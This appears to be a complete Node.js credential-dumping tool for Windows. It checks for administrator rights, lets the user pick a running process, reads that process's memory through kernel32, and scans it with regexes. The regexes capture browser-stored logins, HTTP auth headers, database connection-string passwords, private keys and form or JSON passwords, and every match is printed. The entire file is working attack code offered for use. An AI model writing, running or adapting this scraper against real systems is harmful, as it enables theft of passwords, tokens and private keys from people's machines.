'use strict';

const ffi = require('ffi-napi');
const ref = require('ref-napi');
const { execSync } = require('child_process');
const readline = require('readline');

const PROCESS_QUERY_INFORMATION = 0x0400;
const PROCESS_VM_READ = 0x0010;
const MEM_COMMIT = 0x1000;
const PAGE_READWRITE = 0x04;

// MEMORY_BASIC_INFORMATION layout for 64-bit Windows (48 bytes):
// BaseAddress(8) + AllocationBase(8) + AllocationProtect(4) + _pad(4)
// + RegionSize(8) + State(4) + Protect(4) + Type(4) + _pad(4)
const MBI_SIZE = 48;

function parseMBI(buf) {
  return {
    BaseAddress:       buf.readBigUInt64LE(0),
    AllocationBase:    buf.readBigUInt64LE(8),
    AllocationProtect: buf.readUInt32LE(16),
    RegionSize:        buf.readBigUInt64LE(24),
    State:             buf.readUInt32LE(32),
    Protect:           buf.readUInt32LE(36),
    Type:              buf.readUInt32LE(40),
  };
}

const kernel32 = ffi.Library('kernel32', {
  OpenProcess:       ['pointer', ['uint32', 'bool', 'int32']],
  ReadProcessMemory: ['bool',    ['pointer', 'uint64', 'pointer', 'uint32', 'pointer']],
  VirtualQueryEx:    ['uint64',  ['pointer', 'uint64', 'pointer', 'uint32']],
  CloseHandle:       ['bool',    ['pointer']],
});

// Each entry: { label, re, truncate? } — re must use the 'g' flag.
// truncate: if true, only the first 120 chars of the match are shown (used for key blocks).
const CRED_PATTERNS = [
  // Chromium-family browser in-memory layout: <proto> <user> <pass> NUL
  {
    label: 'browser_memory',
    re: /[a-zA-Z]https? ([a-zA-ZæøåÆØÅ0-9\-_\.@?]{3,20}) ([a-zA-ZæøåÆØÅ0-9#!@$%^&*()\-_+={}[\]:;<>?\/~]{6,40}) \x00/g,
  },
  // HTTP auth headers
  {
    label: 'http_basic_authentication_header',
    re: /Authorization:\s*Basic ([A-Za-z0-9+/=]{8,200})/g,
  },
  {
    label: 'http_bearer_authentication_header',
    re: /(?:Authorization:\s*)?Bearer ([A-Za-z0-9\-_=+/.]{20,500})/g,
  },
  // Database connection strings — capture groups: user, password
  {
    label: 'mongodb_connection_string',
    re: /mongodb(?:\+srv)?:\/\/([^:@\s"'\x00]{1,60}):([^@\s"'\x00]{4,100})@[^\s"'\x00]{4,200}/gi,
  },
  {
    label: 'mysql_connection_url',
    re: /mysql(?:2)?:\/\/([^:@\s"'\x00]{1,60}):([^@\s"'\x00]{4,100})@[^\s"'\x00]{4,200}/gi,
  },
  {
    label: 'postgres_connection_string',
    re: /postgres(?:ql)?:\/\/([^:@\s"'\x00]{1,60}):([^@\s"'\x00]{4,100})@[^\s"'\x00]{4,200}/gi,
  },
  // PEM / OpenSSH / PGP private keys.
  // [^-] is safe here: key bodies never contain hyphens, so the END marker
  // (which starts with -----) can never be consumed mid-match.
  {
    label: 'rsa_private_key',
    re: /-----BEGIN RSA PRIVATE KEY-----[^-]{100,4000}-----END RSA PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'ec_private_key',
    re: /-----BEGIN EC PRIVATE KEY-----[^-]{50,2000}-----END EC PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'generic_private_key',
    re: /-----BEGIN PRIVATE KEY-----[^-]{100,4000}-----END PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'openssh_private_key',
    re: /-----BEGIN OPENSSH PRIVATE KEY-----[^-]{100,8000}-----END OPENSSH PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'pgp_private_key',
    re: /-----BEGIN PGP PRIVATE KEY BLOCK-----[^-]{100,16000}-----END PGP PRIVATE KEY BLOCK-----/g,
    truncate: true,
  },
  // URL-encoded form submission: username=X&password=Y (fields adjacent)
  {
    label: 'form_encoded',
    re: /(?:username|user|login|email)=([^&\s\x00]{3,60})&(?:password|passwd|pwd|pass)=([^&\s\x00]{4,60})/gi,
  },
  // JSON credential field
  {
    label: 'json_password',
    re: /"(?:password|passwd|pwd|secret|token)":\s*"([^"\x00]{4,100})"/gi,
  },
  // Generic key=value or key: value password pair
  {
    label: 'kv_password',
    re: /(?:^|[\s,{;])(?:password|passwd|pwd)\s*[=:]\s*([^\s"'\x00&,\r\n]{4,60})/gim,
  },
];

function isElevated() {
  try {
    execSync('net session', { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function psExec(script) {
  const encoded = Buffer.from(script, 'utf16le').toString('base64');
  return execSync(`powershell -NoProfile -EncodedCommand ${encoded}`, {
    encoding: 'utf8',
    timeout: 15000,
  }).trim();
}

function getAllProcesses() {
  try {
    const raw = psExec(
      'Get-Process | Select-Object Id,ProcessName | Sort-Object ProcessName | ConvertTo-Json -Compress'
    );
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [parsed];
  } catch {
    return [];
  }
}

function buildProcessMenu(processes) {
  const grouped = new Map();
  for (const p of processes) {
    const name = p.ProcessName;
    if (!grouped.has(name)) grouped.set(name, []);
    grouped.get(name).push(Number(p.Id));
  }
  // sorted list of unique names
  const names = [...grouped.keys()].sort((a, b) => a.localeCompare(b));
  return { grouped, names };
}

function printProcessMenu(names, grouped) {
  console.log('\n  #     Process Name                             Instances');
  console.log('  ----  ---------------------------------------- ---------');
  for (let i = 0; i < names.length; i++) {
    const name = names[i];
    const pids = grouped.get(name);
    const num  = String(i + 1).padStart(4);
    const col1 = name.padEnd(40);
    const col2 = pids.length === 1 ? `PID ${pids[0]}` : `${pids.length} instances`;
    console.log(`  ${num}  ${col1} ${col2}`);
  }
}

async function promptSelection(names, grouped) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question('\nEnter number or partial name: ', (answer) => {
      rl.close();
      const trimmed = answer.trim();
      const idx = parseInt(trimmed, 10) - 1;

      if (!isNaN(idx) && idx >= 0 && idx < names.length) {
        const name = names[idx];
        return resolve({ name, pids: grouped.get(name) });
      }

      // Fall back to partial name match
      const lower = trimmed.toLowerCase();
      const match = names.find(n => n.toLowerCase().includes(lower));
      if (match) return resolve({ name: match, pids: grouped.get(match) });

      console.log('No matching process found.');
      resolve(null);
    });
  });
}

function scanPid(pid, seen) {
  const handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
  if (ref.isNull(handle)) return 0;

  let matches = 0;

  try {
    let address = 0n;
    const mbiBuffer   = Buffer.alloc(MBI_SIZE);
    const bytesReadBuf = Buffer.alloc(8);

    while (kernel32.VirtualQueryEx(handle, address.toString(), mbiBuffer, MBI_SIZE)) {
      const mbi      = parseMBI(mbiBuffer);
      const readable = mbi.State === MEM_COMMIT && mbi.Protect === PAGE_READWRITE;

      // Skip regions larger than 256 MB to avoid OOM
      if (readable && mbi.RegionSize > 0n && mbi.RegionSize <= 0x10000000n) {
        const size   = Number(mbi.RegionSize);
        const memBuf = Buffer.alloc(size);

        if (kernel32.ReadProcessMemory(handle, mbi.BaseAddress.toString(), memBuf, size, bytesReadBuf)) {
          const text = memBuf.toString('utf8');

          for (const { label, re, truncate } of CRED_PATTERNS) {
            re.lastIndex = 0;
            let m;
            while ((m = re.exec(text)) !== null) {
              // Sanitise control chars for display, keep the full match as dedup key
              const raw     = m[0].replace(/[\x00-\x08\x0b-\x1f\x7f]/g, '.');
              const deduped = `${label}:${raw}`;
              if (seen.has(deduped)) continue;
              seen.add(deduped);

              const captured = m.slice(1).filter(Boolean).join('  |  ');
              let display = captured || raw;
              if (truncate && display.length > 120) {
                display = display.slice(0, 120) + `  … [${display.length} chars]`;
              }
              console.log(`  [${label}] ${display}`);
              matches++;
            }
          }
        }
      }

      const next = mbi.BaseAddress + mbi.RegionSize;
      if (next <= address || next > 0x7FFFFFFFFFFFFn) break;
      address = next;
    }
  } finally {
    kernel32.CloseHandle(handle);
  }

  return matches;
}

async function main() {
  if (!isElevated()) {
    process.stdout.write('\x1b[31m[x]\x1b[0m Not running elevated\n');
    process.exit(1);
  }

  process.stdout.write('\x1b[32m[v]\x1b[0m Running elevated\n');
  process.stdout.write('Fetching process list...');

  const allProcs = getAllProcesses();
  if (allProcs.length === 0) {
    console.log('\nFailed to fetch process list.');
    process.exit(1);
  }

  const { grouped, names } = buildProcessMenu(allProcs);
  console.log(` ${names.length} unique processes found.`);

  printProcessMenu(names, grouped);

  const selection = await promptSelection(names, grouped);
  if (!selection) process.exit(0);

  const { name, pids } = selection;
  console.log(`\nScanning "${name}" (${pids.length} instance${pids.length > 1 ? 's' : ''})...\n`);

  const seen  = new Set();
  let total   = 0;

  for (const pid of pids) {
    process.stdout.write(`  PID ${String(pid).padEnd(8)}`);
    const count = scanPid(pid, seen);
    console.log(count > 0 ? `${count} match(es)` : 'no matches');
    total += count;
  }

  console.log(`\nTotal unique matches: ${total}`);
}

main().catch(err => {
  console.error('Error:', err.message);
  process.exit(1);
});
